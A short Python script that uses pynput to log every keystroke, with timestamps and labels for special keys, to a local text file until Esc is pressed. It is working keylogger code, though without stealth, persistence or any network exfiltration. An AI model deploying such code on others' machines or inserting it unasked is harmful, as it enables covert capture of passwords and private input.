from pynput.keyboard import Listener
import logging

# Set up logging to save the keystrokes in a file
log_file = "keystrokes.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s")

# Define the function to log each key pressed
def on_press(key):
    try:
        # Log the key press, checking if it's a character
        logging.info(f"{key.char}")
    except AttributeError:
        # Handle special keys like space, enter, etc.
        if key == key.space:
            logging.info(" [Space] ")
        elif key == key.enter:
            logging.info(" [Enter] ")
        elif key == key.tab:
            logging.info(" [Tab] ")
        elif key == key.backspace:
            logging.info(" [Backspace] ")
        else:
            logging.info(f" {key} ")

# Define the function to stop the listener
def on_release(key):
    if key == key.esc:
        # Exit the listener when the 'esc' key is pressed
        return False

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

